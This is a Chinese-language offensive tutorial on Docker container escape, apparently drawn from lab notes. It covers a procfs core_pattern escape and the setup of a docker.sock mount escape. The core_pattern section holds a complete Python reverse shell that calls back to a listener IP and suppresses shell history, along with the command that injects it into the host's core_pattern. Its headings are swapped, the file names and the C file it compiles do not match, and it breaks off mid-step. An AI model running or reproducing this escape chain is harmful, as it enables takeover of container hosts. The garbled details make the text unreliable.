Docket介绍：

Docker容器与虚拟机类似，但两者在原理上不同，容器是将操作系统层虚拟化，虚拟机则是虚拟化硬件，因此容器更具有便携性，高效的利用服务器

Docker所面临的风险：

  1. 不安全的第三方组件
  2. 不安全的镜像
  3. 敏感信息泄露

前渗透：

  1. 判断在Docker中(看后面的内容)
    1. 没有拿到权限：端口扫描详细信息，根据应用对象表现
    2. 拿到权限：需要注意的是，如果你获取的shell权限过小的话(www-data、或是某一服务的用户)，根目录下也是不存在.dockerenv文件的
  2. 镜像中的应用的漏洞
  3. 镜像中的默认配置

后渗透：

  1. 特权模式启动导致（不安全启动 适用于java jsp高权限无需提权 还要提权才能逃逸）
  2. 危险挂载启动导致（危险启动 适用于java jsp高权限无需提权 还要提权才能逃逸）
  3. Docker自身&系统漏洞（软件漏洞和系统漏洞 都可用）

补充：如果Docker拉取镜像缓慢，可以试试阿里云提供的镜像加速器

三. 容器逃逸-危险挂载（Docker Socke）

在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部

https://wiki.teamssix.com/CloudNative/Docker/docker-socket-escape.html

1.启动环境：

docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu

2.检测环境：

​ 如果找到两个 core_pattern 文件，那可能就是挂载了宿主机的 procfs

find / -name core_pattern

3.复现

找到当前容器在宿主机下的绝对路径

cat /proc/mounts | xargs -d ‘,’ -n 1 | grep workdir

这就表示当前绝对路径为：

/var/lib/docker/overlay2/de24c974ca0126f3eb03866a545c07eb81ad036b4d4db98aac2a6c0929e27275

4.写入文件：

cat >/tmp/.x.py << EOF
#!/usr/bin/python
import os
import pty
import socket
lhost = “192.168.209.222” //反弹IP
lport = 4444 //反弹端口
def main():
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.putenv(“HISTFILE”, ‘/dev/null’)
pty.spawn(“/bin/bash”)
os.remove(‘/tmp/.x.py’)
s.close()
if name == “main”:
main()
EOF

写入反弹 shell 到目标的 proc 目录下：

echo -e “|/var/lib/docker/overlay2/de24c974ca0126f3eb03866a545c07eb81ad036b4d4db98aac2a6c0929e27275/merged/tmp/.t.py \rcore “ > /host/proc/sys/kernel/core_pattern

cd /tmp
gcc x.c -o x //编译c文件

apt-get update -y && apt-get install gcc -y
//实战中不推荐安装gcc环境，可以在linux上编译好后上传到容器中执行就行

./x

进行监听即可

四. 容器逃逸-挂载宿主机 procfs 逃逸

https://wiki.teamssix.com/cloudnative/docker/docker-procfs-escape.html

1.启动靶机（创建一个容器并挂载/var/run/docker/sock ）：

docker run -itd –name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu

  1. 进入环境：

    docker exec -it with_docker_sock /bin/bash

  1. 检测漏洞：

    ls -lah /var/run/docker.sock

4、挂载逃逸（在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部）
